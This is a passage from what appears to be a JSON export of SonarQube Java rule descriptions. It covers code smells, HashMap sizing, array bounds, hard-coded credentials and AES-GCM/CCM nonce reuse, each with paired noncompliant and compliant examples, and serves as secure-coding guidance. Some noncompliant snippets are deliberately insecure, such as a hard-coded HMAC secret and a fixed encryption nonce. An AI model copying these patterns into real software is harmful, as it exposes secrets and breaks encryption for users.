- The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6547","summary":"Environment variables should not be defined from untrusted input","tags":["cwe","sans-top25","injection"],"versions":{"serverEdition":"Developer","serverVersion":"10.1.0.73491","communityVersion":null},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<p>Methods should not perform too many tasks (Brain Method).</p>\n<h2>Why is this an issue?</h2>\n<p>This issue is raised when Sonar considers that a method is a 'Brain Method'. <br> A Brain Method is a method that tends to centralize its ownerâs\nclass logic and generally performs too many operations. This can include checking too many conditions, using lots of variables, and ultimately making\nit difficult to understand, maintain and reuse.<br> It is characterized by high LOC number, high cyclomatic and cognitive complexity, and a large\nnumber of variables being used.</p>\n<h3>What is the potential impact?</h3>\n<p>Brain Methods are often hard to cover with tests, because of their deep nesting, and they are error-prone, because of the many local variables they\nusually introduce. Such methods will be very hard to read and understand for anyone outside who created them, and therefore hard to maintain and fix\nif bugs get spotted.<br> They also enable code duplication since the method itself can hardly be reused anywhere else.</p>\n<h2>How to fix it</h2>\n<p>The common approach is to identify fragments of the methodâs code that deal with a specific responsibility and extract them to a new method. This\nwill make each method more readable, easy to understand and maintain, easier to test, and more prone to be reused.<br> In this paper, the authors\ndescribe a systematic procedure to refactor this type of code smell: <a href=\"https://dl.acm.org/doi/10.1145/3191314\">\"Assessing the Refactoring of\nBrain Methods\"</a>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nvoid farmDailyRoutine() {\n    Crops southEastCrops = getCrops(1, -1);\n    Crops eastCrops = getCrops(1, 0);\n    WaterContainer waterContainer = new WaterContainer();\n    List&lt;Bottle&gt; bottles = new ArrayList&lt;&gt;();\n    for(int i = 0; i &lt; 10; i++) {\n        var bottle = new Bottle();\n        bottle.addWater(10L);\n        bottle.putCap();\n        bottle.shake(2);\n        bottles.add(bottle);\n    }\n    waterContainer.store(bottles);\n\n    Truck t1 = new Truck(Truck.Type.TRANSPORT);\n    t1.load(waterContainer);\n    if(Weather.current != Weather.RAINY) {\n        WaterContainer extraWaterContainer = new WaterContainer();\n        List&lt;Bottle&gt; extraBottles = new ArrayList&lt;&gt;();\n        if(southEastCrops.isDry()) {\n            for(LandSlot ls : southEastCrops.lands()) {\n                Bottle b = new Bottle();\n                b.addWater(10L);\n                b.putCap();\n                extraBottles.add(b);\n            }\n        } else {\n            extraBottles.add(new Bottle());\n        }\n        if(eastCrops.isDry()) {\n            for(LandSlot ls : southEastCrops.lands()) {\n                Bottle b = new Bottle();\n                b.addWater(10L);\n                b.putCap();\n                extraBottles.add(b);\n            }\n        } else {\n            extraBottles.add(new Bottle());\n        }\n        extraWaterContainer.store(extraBottles);\n        t1.load(extraWaterContainer);\n    } else {\n        WaterContainer extraWaterContainer = WaterSource.clone(waterContainer);\n        t1.load(extraWaterContainer)\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre>\nvoid farmDailyRoutine() { // Compliant: Simpler method, making use of extracted and distributed logic\n    Crops southEastCrops = getCrops(1, -1);\n    Crops eastCrops = getCrops(1, 0);\n    WaterContainer waterContainer = new WaterContainer();\n    List&lt;Bottle&gt; bottles = getWaterBottles(10, 10L, true);\n    waterContainer.store(bottles);\n\n    Truck t1 = new Truck(Truck.Type.TRANSPORT);\n    t1.load(waterContainer);\n    if(Weather.current != Weather.RAINY) {\n        WaterContainer extraWaterContainer = new WaterContainer();\n        fillContainerForCrops(extraWaterContainer, southEastCrops);\n        fillContainerForCrops(extraWaterContainer, eastCrops);\n        t1.load(extraWaterContainer);\n    } else {\n        WaterContainer extraWaterContainer = WaterSource.clone(waterContainer);\n        t1.load(extraWaterContainer)\n    }\n}\n\nprivate fillContainerForCrops(WaterContainer wc, Crops crops) { // Compliant: extracted readable and reusable method\n    if(crops.isDry()) {\n        wc.store(getWaterBottles(crops.lands().size(), 10L, false));\n    } else {\n        wc.store(Collections.singleton(new Bottle()));\n    }\n}\n\nprivate List&lt;Bottle&gt; getWaterBottles(int qt, long liquid, boolean shake){ // Compliant: extracted readable and reusable method\n    List&lt;Bottle&gt; bottles = new ArrayList&lt;&gt;();\n    for(int i = 0; i &lt; qt; i++) {\n        Bottle b = new Bottle();\n        b.addWater(liquid);\n        b.putCap();\n        if(shake) {\n            b.shake();\n        }\n        bottles.add(b);\n    }\n    return bottles;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In this case, the method <code>farmDailyRoutine</code> was taking care of performing many different tasks, with nested conditions and loops, it was\nlong and had plenty of local variables. By separating its logic into multiple single-responsibility methods, it is reusing parts of its original\nduplicated code and each of the new methods is now readable and easy to understand. They are now also easier to cover with tests, and many other parts\nof the owner class could benefit from using these methods.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://link.springer.com/book/10.1007/3-540-39538-5\">\"Object-Oriented Metrics in Practice: Using Software Metrics to Characterize,\n  Evaluate, and Improve the Design of Object-Oriented Systems\"</a> by M. Lanza, R. Marinescu <br> </li>\n  <li> <a href=\"https://dl.acm.org/doi/10.1145/3191314\">\"Assessing the Refactoring of Brain Methods\"</a> by S. Vidal, I. Berra, S. Zulliani, C.\n  Marcos, J. A. Diaz Pace <br> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6541","summary":"Methods should not perform too many tasks (aka Brain method)","tags":["architecture","design"],"versions":{"serverEdition":"Developer","serverVersion":"10.1.0.73491","communityVersion":"10.1.0.73491"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<p>\"Monster Class\" is a class that implements too many functionalities that are not well organized, or cohesive. Monster Classes are not created\nintentionally, but rather they often arise over time as a result of poor software design or a lack of attention to good programming practices such as\nmodularization and encapsulation. As a software evolves and new requirements are added, it can be tempting to add new functionality to existing\nclasses rather than creating new classes to handle the new functionality. This leads to classes becoming bloated and difficult to understand and\nmaintain, ultimately resulting in a Monster Class.</p>\n<p>Here are the characteristics of a Monster Class:</p>\n<ul>\n  <li> High number of instance variables and methods </li>\n  <li> Variables and methods that are not related to each other (low cohesion and high coupling) </li>\n  <li> Too many responsibilities, violating the Single Responsibility Principle (aka SRP) </li>\n  <li> Difficult to test, leading to poor test coverage and a higher risk of defects </li>\n</ul>\n<h2>Why is this an issue?</h2>\n<p>Monster Classes become monolithic entities, with numerous responsibilities and functionalities packed into a single class. This is problematic\nbecause it violates the Single Responsibility Principle, which states that a class should have only one reason to change.</p>\n<p>When a class has too many responsibilities and functionalities, it becomes difficult to maintain. Changes to one part of the class can\nunintentionally affect other parts, leading to bugs. Additionally, it can be difficult to test the class, as there may be many different interactions\nbetween different parts of the class that need to be considered.</p>\n<h2>How to fix it</h2>\n<p>There is no magical recipe. Monster Classes should be refactored and broken into smaller, more focused classes, each one with a single\nresponsibility. When a class has only one responsibility, it is easier to reason about its behavior and to make changes to it without affecting other\nparts of the code.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With a threshold of 5:</p>\n<pre>\nclass Foo { // class Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7\n  T1 t1;\n  T2 t2;\n  T3 t3;\n\n  public T4 compute(T5 a, T6 b) {\n    T7 result = a.getResult(b);\n    return (T4) result;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre>\npublic class Bar {\n    T8 a8;\n    T9 a9;\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.cleancoder.com/uncle-bob/2014/05/08/SingleReponsibilityPrinciple.html\">Single Responsibility Principle (aka SRP)</a>\n  </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/SOLID\">SOLID</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6539","summary":"Classes should not depend on an excessive number of classes (aka Monster Class)","tags":["architecture","design"],"versions":{"serverEdition":"Developer","serverVersion":"10.1.0.73491","communityVersion":"10.1.0.73491"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Hash-based collections with known capacity should be initialized with the proper related static method.</p>\n<h2>Why is this an issue?</h2>\n<p>When creating an instance of HashMap or HashSet, the developer can pick a constructor with known capacity. However, the requested capacity is not\nfully allocated by default. Indeed, when the collection reaches the load factor of the collection (default: 0.75), the collection is resized on the\nfly, leading to unexpected performance issues.</p>\n<h2>How to fix it</h2>\n<p>As of Java 19, hash-based collections provide a static method that allocates the requested capacity at construction time.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nprivate static final int KNOWN_CAPACITY = 1_000_000;\n\npublic static Map&lt;String, Integer&gt; buildAMap() {\n    return new HashMap&lt;&gt;(KNOWN_CAPACITY); // Noncompliant\n}\n\npublic static Set&lt;String&gt; buildASet() {\n    return new HashSet&lt;&gt;(KNOWN_CAPACITY); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre>\nprivate static final int KNOWN_CAPACITY = 1_000_000;\n\npublic static Map&lt;String, Integer&gt; buildABetterMap() {\n    return HashMap.newHashMap(KNOWN_CAPACITY);\n}\n\npublic static Set&lt;String&gt; buildABetterSet() {\n    return HashSet.newHashSet(KNOWN_CAPACITY);\n}\n\npublic static Set&lt;String&gt; buildABetterSet(float customLoadFactor) {\n    return new HashSet&lt;&gt;(KNOWN_CAPACITY, customLoadFactor);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/HashMap.html#newHashMap(int\">https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/HashMap.html#newHashMap(int</a>) </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/HashSet.html#newHashSet(int\">https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/HashSet.html#newHashSet(int</a>) </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/LinkedHashMap.html#newLinkedHashMap(int\">https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/LinkedHashMap.html#newLinkedHashMap(int</a>) </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/LinkedHashSet.html#newLinkedHashSet(int\">https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/LinkedHashSet.html#newLinkedHashSet(int</a>) </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/WeakHashMap.html#newWeakHashMap(int\">https://docs.oracle.com/en/java/javase/19/docs/api/java.base/java/util/WeakHashMap.html#newWeakHashMap(int</a>) </li>\n</ul>\n<p>Message:<br> Replace this call to the constructor with the better suited static method.</p>\n<p>Highlighting:<br> The infringing constructor call.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6485","summary":"Hash-based collections with known capacity should be initialized with the proper related static method.","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"10.1.0.73491","communityVersion":"10.1.0.73491"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Critical","description":"<p>An array index out-of-bounds exception is a bug class that occurs in Java when a program tries to access an array element that does not exist. This\nbug can cause your program to crash or behave unexpectedly. To fix an array index out of bounds exception in Java, you should always ensure that you\nare accessing array elements within the bounds of the array.</p>\n<h2>Why is this an issue?</h2>\n<p>An array index out-of-bounds exception indicates a bug or a logical error in the code.</p>\n<p>In Java, arrays have a fixed size, and their elements are indexed starting from <code>0</code>, counting up to the last index that is still smaller\nthan the size. When trying to access an array outside of this range, an <code>ArrayIndexOutOfBoundsException</code> will be thrown and the operation\nwill fail.</p>\n<h3>What is the potential impact?</h3>\n<p>Issues of this type interrupt the normal execution of a program, causing it to crash or putting it into an inconsistent state. Therefore, this\nissue might impact the availability and reliability of your application, or even result in data loss.</p>\n<p>If the computation of an index value is tied to user input data, this issue can potentially even be exploited by attackers to disrupt your\napplication.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following examples contain out-of-bounds accesses to arrays, resulting in <code>ArrayIndexOutOfBounds</code> exceptions. These situations can\nbe avoided by carefully considering the range of valid index values, or even better, by comparing indices against the size of a sequence.</p>\n<p>In this first example, the array <code>arr</code> contains three elements. Since the first element of a list has index <code>0</code>, the last\nvalid index is <code>2</code>. Therefore, an <code>ArrayIndexOutOfBoundsException</code> is thrown when accessing <code>arr</code> at index\n<code>3</code>.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n  void fun() {\n    int[] arr = {1, 2, 3};\n\n    int x = arr[3]; // Noncompliant: Valid indices are 0, 1 and 2\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n  void fun() {\n    int[] arr = {1, 2, 3};\n\n    int x = arr[0];\n  }\n</pre>\n<p>Accessing an array with its size as the index is never correct:</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n  void fun(int[] arr) {\n    System.out.println(arr[arr.length]); // Noncompliant: Indexing starts at 0, hence array.length will always be an invalid index.\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n  void compliant(int[] arr) {\n    // We can make sure arr is non-empty before trying to access its last element.\n    if (arr.length &gt; 0) {\n      System.out.println(arr[arr.length - 1]);\n    } else {\n      System.out.println(\"Empty array!\");\n    }\n  }\n</pre>\n<h3>How does this work?</h3>\n<p>You should always ensure that you are accessing arrays using indices that are within the bounds of the array. Here are some best practices to\nfollow:</p>\n<p>Always compare indices against the length of an array using <code>if-else</code> statements or other control flow constructs before accessing\nelements. For this, you can use the <code>length</code> property of arrays. For example, <code>arr.length</code> returns the length of the\n<code>arr</code> array. Also, ensure that you are not accessing an array using negative indices.</p>\n<p>Use loops to iterate over arrays instead of accessing elements directly. This can be done using the <code>for</code> loop or the\n<code>foreach</code> loop. For example, <code>for (int i = 0; i &lt; arr.length; ++i)</code> iterates over the <code>arr</code> array within its\nbounds using an index variable <code>i</code>. The same goes for <code>for (Object o : arr)</code>. If you manipulate the index used to access an\narray inside the loop, make sure that the resulting index stays within bounds.</p>\n<h3>Pitfalls</h3>\n<p>The indices <code>0</code>, or <code>arr.length - 1</code> for the first and last element of an array are not always valid! Make sure the array in\nquestion is not empty before accessing these indices.</p>\n<h3>Going the extra mile</h3>\n<p>In many cases you can eliminate loops containing index-based accesses altogether by applying the Java stream API to arrays using\n<code>java.util.Arrays.stream()</code>. The API provides methods like <code>map()</code> or <code>filter()</code> that allow you to transform, filter\nand perform many different operations on the elements of an array without using indices.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/ArrayIndexOutOfBoundsException.html\">ArrayIndexOutOfBoundsException</a>\n  </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/Arrays.html#stream(T%5B%5D)\">Javadoc for\n  <code>Arrays.stream()</code></a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/stream/Stream.html\">Stream API</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> A Reference Guide - <a href=\"https://www.baeldung.com/java-arrays-guide\">Arrays in Java</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-10.html#jls-10.4\">Array Access Specification</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6466","summary":"Accessing an array element should not trigger an ArrayIndexOutOfBoundsException","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.2.1.78527","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who donât need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the peopleâs role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of\nclient applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own\nneed, including in a way that was not expected.</p>\n<p>This additional use of the secret will lead to added costs with the service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\napplication. This might result in a partial denial of service for all the applicationâs users.</p>\n<h4>Applicationâs security downgrade</h4>\n<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the\naffected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting\nserver or another linked component.</p>\n<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.\nAn attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secretâs security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.h2.security.SHA256;\n\nString inputString = \"s3cr37\";\nbyte[] key         = inputString.getBytes();\n\nSHA256.getHMAC(key, message);  // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.h2.security.SHA256;\n\nString inputString = System.getenv(\"SECRET\");\nbyte[] key         = inputString.getBytes();\n\nSHA256.getHMAC(key, message);\n</pre>\n<h3>How does this work?</h3>\n<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secretâs value from its environment. This\nallows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>\n<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\">What is AWS Secrets Manager</a> </li>\n  <li> Azure Documentation - <a href=\"https://learn.microsoft.com/en-us/azure/key-vault/\">Azure Key Vault</a> </li>\n  <li> Google Cloud - <a href=\"https://cloud.google.com/secret-manager/docs\">Secret Manager documentation</a> </li>\n  <li> HashiCorp Developer - <a href=\"https://developer.hashicorp.com/vault/docs\">Vault Documentation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 - Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 - Category A2 - Broken\n  Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6437","summary":"Credentials should not be hard-coded","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.7.1.62043","communityVersion":"9.7.1.62043"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>When encrypting data using AES-GCM or AES-CCM, it is essential not to reuse the same initialization vector (IV, also called nonce) with a given\nkey. To prevent this, it is recommended to either randomize the IV for each encryption or increment the IV after each encryption.</p>\n<h2>Why is this an issue?</h2>\n<p>When encrypting data using a counter (CTR) derived block cipher mode of operation, it is essential not to reuse the same initialization vector (IV)\nfor a given key. An IV that complies with this requirement is called a \"nonce\" (<strong>n</strong>umber used <strong>once</strong>). Galois/Counter\n(GCM) and Counter with Cipher Block Chaining-Message Authentication Code (CCM) are both derived from counter mode.</p>\n<p>When using AES-GCM or AES-CCM, a given key and IV pair will create a \"keystream\" that is used to encrypt a plaintext (original content) into a\nciphertext (encrypted content.) For any key and IV pair, this keystream is always deterministic. Because of this property, encrypting several\nplaintexts with one key and IV pair can be catastrophic. If an attacker has access to one plaintext and its associated ciphertext, they are able to\ndecrypt everything that was created using the same pair.</p>\n<p>Additionally, IV reuse also drastically decreases the key recovery computational complexity by downgrading it to a simpler polynomial root-finding\nproblem. This means that even without access to a plaintext/ciphertext pair, an attacker may still be able to decrypt all the sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>If the encryption that is being used is flawed, attackers might be able to exploit it in several ways. They might be able to decrypt existing\nsensitive data or bypass key protections.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By not using the encryption algorithm correctly, the likelihood that an attacker might be able to recover the original sensitive data drastically\nincreases.</p>\n<h4>Additional attack surface</h4>\n<p>Encrypted values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them. If an\nattacker is able to modify the cleartext of the encrypted message, it might be possible to trigger other vulnerabilities in the code.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The example uses a hardcoded IV as a nonce, which causes AES-CCM to be insecure. To fix it, a nonce is randomly generated instead.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\npublic void encrypt(byte[] key, byte[] ptxt) {\n    byte[] nonce = \"7cVgr5cbdCZV\".getBytes(\"UTF-8\");\n\n    Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    SecretKeySpec keySpec = new SecretKeySpec(key, \"AES\");\n    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);\n\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\npublic void encrypt(byte[] key, byte[] ptxt) {\n    SecureRandom random = new SecureRandom();\n    byte[] nonce = new byte[12];\n    random.nextBytes(nonce);\n\n    Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    SecretKeySpec keySpec = new SecretKeySpec(key, \"AES\");\n    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);\n\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>For AES-GCM and AES-CCM, NIST recommends generating a nonce using either a deterministic approach or using a 'Random Bit Generator (RBG)'.</p>\n<h4>Generating nonces using random number generation</h4>\n<p>When using a randomized approach, NIST recommends a nonce of at least 96 bits using a cryptographically secure pseudorandom number generator\n(CSPRNG.) Such a generator can create output with a sufficiently low probability of the same number being output twice (also called a\n<em>collision</em>) for a long time. However, after 2<sup>32</sup> generated numbers for the same key, NIST recommends rotating this key for a new\none. After that amount of generated numbers, the probability of a collision is high enough to be considered insecure.</p>\n<p>The code example above demonstrates how CSPRNGs can be used to generate nonces.</p>\n<p>Be careful to use a random number generator that is sufficiently secure. Default (non-cryptographically secure) RNGs might be more prone to\ncollisions in their output, which is catastrophic for counter-based encryption modes.</p>\n<h4>Deterministically generating nonces</h4>\n<p>One method to prevent the same IV from being used multiple times for the same key is to update the IV in a deterministic way after each encryption.\nThe most straightforward deterministic method for this is a counter.</p>\n<p>The way this works is simple: for any key, the first IV is the number zero. After this IV is used to encrypt something with a key, it is\nincremented for that key (and is now equal to 1). Although this requires additional bookkeeping, it should guarantee that for each encryption key, an\nIV is never repeated.</p>\n<p>For a secure implementation, NIST suggests generating these nonces in two parts: a fixed field and an invocation field. The fixed field should be\nused to identify the device executing the encryption (for example, it could contain a device ID), such that for one key, no two devices can generate\nthe same nonce. The invocation field contains the counter as described above. For a 96-bit nonce, NIST recommends (but does not require) using a\n32-bit fixed field and a 64-bit invocation field. Additional details can be found in the <a\nhref=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST Special Publication 800-38D</a>.</p>\n<h2>How to fix it in BouncyCastle</h2>\n<h3>Code examples</h3>\n<p>The example uses a hardcoded IV as a nonce, which causes AES-CCM to be insecure. To fix it, a nonce is randomly generated instead.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\npublic void encrypt(byte[] key, byte[] ptxt) {\n    byte[] nonce = \"7cVgr5cbdCZV\".getBytes(StandardCharsets.UTF_8);\n\n    BlockCipher engine = new AESEngine();\n    AEADParameters params = new AEADParameters(new KeyParameter(key), 128, nonce);\n    CCMBlockCipher cipher = new CCMBlockCipher(engine);\n\n    cipher.init(true, params); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\npublic void encrypt(byte[] key, byte[] ptxt) {\n    SecureRandom random = new SecureRandom();\n    byte[] nonce = new byte[12];\n    random.nextBytes(nonce);\n\n    BlockCipher engine = new AESEngine();\n    AEADParameters params = new AEADParameters(new KeyParameter(key), 128, nonce);\n    CCMBlockCipher cipher = new CCMBlockCipher(engine);\n\n    cipher.init(true, params);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>For AES-GCM and AES-CCM, NIST recommends generating a nonce using either a deterministic approach or using a 'Random Bit Generator (RBG)'.</p>\n<h4>Generating nonces using random number generation</h4>\n<p>When using a randomized approach, NIST recommends a nonce of at least 96 bits using a cryptographically secure pseudorandom number generator\n(CSPRNG.) Such a generator can create output with a sufficiently low probability of the same number being output twice (also called a\n<em>collision</em>) for a long time. However, after 2<sup>32</sup> generated numbers for the same key, NIST recommends rotating this key for a new\none. After that amount of generated numbers, the probability of a collision is high enough to be considered insecure.</p>\n<p>The code example above demonstrates how CSPRNGs can be used to generate nonces.</p>\n<p>Be careful to use a random number generator that is sufficiently secure. Default (non-cryptographically secure) RNGs might be more prone to\ncollisions in their output, which is catastrophic for counter-based encryption modes.</p>\n<h4>Deterministically generating nonces</h4>\n<p>One method to prevent the same IV from being used multiple times for the same key is to update the IV in a deterministic way after each encryption.\nThe most straightforward deterministic method for this is a counter.</p>\n<p>The way this works is simple: for any key, the first IV is the number zero. After this IV is used to encrypt something with a key, it is\nincremented for that key (and is now equal to 1). Although this requires additional bookkeeping, it should guarantee that for each encryption key, an\nIV is never repeated.</p>\n<p>For a secure implementation, NIST suggests generating these nonces in two parts: a fixed field and an invocation field. The fixed field should be\nused to identify the device executing the encryption (for example, it could contain a device ID), such that for one key, no two devices can generate\nthe same nonce. The invocation field contains the counter as described above. For a 96-bit nonce, NIST recommends (but does not require) using a\n32-bit fixed field and a 64-bit invocation field. Additional details can be found in the <a\nhref=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST Special Publication 800-38D</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a 